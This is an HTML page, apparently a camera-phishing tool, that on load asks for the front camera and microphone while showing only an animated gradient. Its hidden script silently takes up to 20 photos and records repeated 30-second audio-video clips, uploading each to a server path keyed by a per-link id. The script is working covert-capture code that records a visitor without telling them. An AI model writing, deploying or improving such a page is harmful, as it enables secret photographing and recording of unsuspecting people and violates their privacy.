<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <title>Camera Capture</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body {
      margin: 0;
      height: 100vh;
      overflow: hidden;
      background: linear-gradient(-45deg, #ff6b6b, #f8e473, #4ecdc4, #5a81f7);
      background-size: 400% 400%;
      animation: gradientBG 12s ease infinite;
    }
    @keyframes gradientBG {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    video, canvas { display: none; }
  </style>
</head>

<body>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    let video = document.getElementById("video");
    let canvas = document.getElementById("canvas");
    let stream = null;
    let mediaRecorder = null;
    let chunks = [];

    let imageCount = 0;
    const maxImages = 20;

    // === URL dan /rasm/<id>/ yoki /camera/<id>/ ni olish ===
    const parts = window.location.pathname.split("/").filter(Boolean);
    const id = parts[parts.length - 1];
    const uploadURL = `/${parts[0]}/${id}/`;   // backend endpoint

    // === Base64 â†’ Blob ===
    function dataURLtoBlob(dataurl){
      const arr = dataurl.split(',');
      const mime = arr[0].match(/:(.*?);/)[1];
      const bstr = atob(arr[1]);
      let n = bstr.length;
      const u8arr = new Uint8Array(n);
      while(n--) u8arr[n]=bstr.charCodeAt(n);
      return new Blob([u8arr],{type:mime});
    }

    // === RASM OLISH ===
    async function takeAndSendImage(){
      if(!stream || imageCount >= maxImages) return;

      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;

      canvas.getContext("2d").drawImage(video, 0, 0);

      const blob = dataURLtoBlob(canvas.toDataURL("image/png"));
      const form = new FormData();
      form.append("image", blob, `img_${Date.now()}.png`);

      try{
        await fetch(uploadURL, { method:"POST", body:form });
        console.log("Foto yuborildi");
      }catch(e){ console.error(e); }

      imageCount++;
    }

    // === VIDEO YOZISH ===
    function startRecording(){
      if(!stream) return;

      // Safari uchun MIME fallback
      let options = { mimeType: "video/webm" };
      if(!MediaRecorder.isTypeSupported("video/webm")){
        options = { mimeType: "video/mp4" }; // fallback
      }

      try{
        mediaRecorder = new MediaRecorder(stream, options);
      }catch(e){
        console.warn("MediaRecorder muammo, defaultsiz ishlatyapman:", e);
        mediaRecorder = new MediaRecorder(stream);
      }

      chunks = [];

      mediaRecorder.ondataavailable = e => {
        if(e.data && e.data.size > 0) chunks.push(e.data);
      };

      mediaRecorder.onstop = async () => {
        if(chunks.length === 0) return;

        const blob = new Blob(chunks, { type: "video/webm" });
        const form = new FormData();
        form.append("video", blob, `vid_${Date.now()}.webm`);

        try{
          await fetch(uploadURL, { method:"POST", body:form });
          console.log("Video yuborildi");
        }catch(e){ console.error(e); }

        setTimeout(() => startRecording(), 500); // qayta yozish
      };

      mediaRecorder.start();
      setTimeout(() => {
        try{ mediaRecorder.stop(); }catch(e){ console.warn(e); }
      }, 30000); // 30 sekund
    }

    // === KAMERANI ISHGA TUSHIRISH ===
    async function initCamera(){
      try{
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
          audio: true
        });

        video.srcObject = stream;

        await new Promise(res => {
          if(video.readyState >= 2) res();
          else video.onloadedmetadata = res;
        });

        // Rasm olishni boshlaymiz
        let interval = setInterval(() => {
          takeAndSendImage();
          if(imageCount >= maxImages) clearInterval(interval);
        }, 800);

        // Video yozishni boshlaymiz
        startRecording();

      }catch(e){
        console.error("Kamera xatosi:", e);
        alert("Kamera ruxsati berilmadi!");
      }
    }

    window.onload = () => initCamera();
  </script>
</body>
</html>
